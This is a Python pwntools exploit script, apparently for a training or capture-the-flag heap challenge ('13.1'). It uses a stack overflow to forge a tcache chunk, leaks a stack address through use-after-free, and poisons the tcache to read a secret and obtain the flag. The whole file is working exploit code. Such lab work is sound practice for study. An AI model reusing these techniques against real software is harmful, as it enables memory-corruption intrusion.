#!/usr/bin/env python

from pwn import *

get_flag = True
chall_name = '13.1'

context.arch = "amd64"

def run_with_gdb(p):
    gdb.attach(p,'''
    b *main
    #b *main+1768
    #commands
    #x/8gx $rax-0x8
    #end''') # b *+121
    run_exploit(p, False)
    # 8xg

def run_commands_list(commands, p, print_command):
    for command in commands:
        if print_command and not get_flag:
            print('COMMAND: ', command)
            input("")
        print_send_print(command, p)

def print_send_print(line_to_send, p):
    try:
        p.sendline(line_to_send)
        if get_flag:
            print(p.recvrepeat(1).decode())
        else:
            print(p.recvrepeat(0.2).decode())
    except:
        print('Exception in \'print_send_print\'')
        pass
      
def get_address_leak_from_output(output):
    start_search_string = b'Data: '
    leak_start = output.find(start_search_string) + len(start_search_string)
    leak_ends = output.find(b'\n', leak_start)
    leaked_bytes = output[leak_start:leak_ends]
    return adjust_bytes_leaked_address(leaked_bytes)

def adjust_bytes_leaked_address(byte_address):
    bytearray_address = bytearray(byte_address)
    bytearray_address.reverse()
    address = int(bytearray_address.hex(), 16)
    return address

def get_secret_from_output(output):
    start_search_string = 'Data: '
    secret_start = output.find(start_search_string) + len(start_search_string)
    secret_ends = output.find('\n', secret_start)
    return output[secret_start:secret_ends]

def run_exploit(p, debug):
    if debug:
        run_with_gdb(p)

    welcome_message = p.recvrepeat(1).decode()
    print(welcome_message)

    ########### STAGE 1 - LEAKING A STACK ADDRESS #################
    """
    here i used a BUFFER OVERFLOW to create a fake chunk in a stack variable, freed the fake
    chunk to put him in tcache, used a USE-AFTER-FREE with another chunk to leak the next
    key, witch is pointing to the fake chunk on the stack, thus, leaking a address of the stack
    """

    overflow_to_stack_free = b'A' * (64 - 8) # overflowing until stack_free (64) - 8 (because metadata)
    fake_chunk_metadata_size = p64(0x0000000000000031)

    commands = [
            b'stack_scanf ' + overflow_to_stack_free + fake_chunk_metadata_size + p64(0x0) + p64(0x0), # overflowing and creating metadata to represent a fake heap chunk
            b'stack_free', # freeing the fake chunk created in the stack and putting him on tcache
            b'malloc 0 31', # getting a pointer for the fake chunk
            b'malloc 1 31', # creating a helper chunk that i will use for leak a address
            b'free 0', # freeing in a nice order to get the leak
            b'free 1'
    ]
    run_commands_list(commands, p, True)

    input("")
    p.sendline('puts 1') # puts the freed chunk will print the 'NEXT' key of the chunk
    stack_leak = get_address_leak_from_output(p.recvrepeat(1))
    print('We have a stack leak:', hex(stack_leak))

    secret_address = stack_leak + 0xA6 # the distance between the two chars variables (stack_free and secret)
    print('We have the secret address:', hex(secret_address))

    ########### STAGE 2 - CALCULATION THE SECRET ADDRESS AND GETTING FLAG #################
    """
    the secret address is close to the stack_free variable leaked previously, we got the offset
    and calculate in runtime now. To get the secret, i reused the USE-AFTER-FREE vulnerabilty
    to overwrite a next key of a freed chunk to point to the secret address. After that
    i malloc the secret address and can only print half of the secret because the other
    half is going to be nulled out when malloc gets the freed chunk (the half nulled out should
    be representing the KEY value of a chunk). To pass the check made with memcpy i had
    to pass the nulls because of the size in the check.
    """

    secret_address = stack_leak + 0xBA # the distance between the two chars variables
    print('We have the secret address:', hex(secret_address))
    commands = [
        b'scanf 1 ' + p64(secret_address), # overwriting the next chunk in tcache with the secret address
        b'malloc 0 30', # discarding the auxiliary chunk to get the secret chunk next
        b'malloc 0 30', # getting the chunk poiting to secret
    ]
    run_commands_list(commands, p, True)

    p.sendline(b'puts 0') # the allocation 0 now is poiting to the secret
    leaked_secret_output = p.recvrepeat(1).decode()
    secret = get_secret_from_output(leaked_secret_output)
    p.sendline('send_flag')
    # inserting nulls with the secret because malloc null out half (malloc thinks that its the key)
    p.sendline(secret + '\x00\x00\x00\x00\x00\x00\x00\x00')
    print(p.recvrepeat(1).decode())
    p.sendline('quit')

    p.close()

if get_flag:
    ssh_connection = ssh(host='college',user='hacker')
    process_full_path = '/challenge/' + chall_name
    p = ssh_connection.run(process_full_path)
    run_exploit(p, False)
    ssh_connection.close()
else:
    p = process('./' + chall_name)
    run_exploit(p, True)
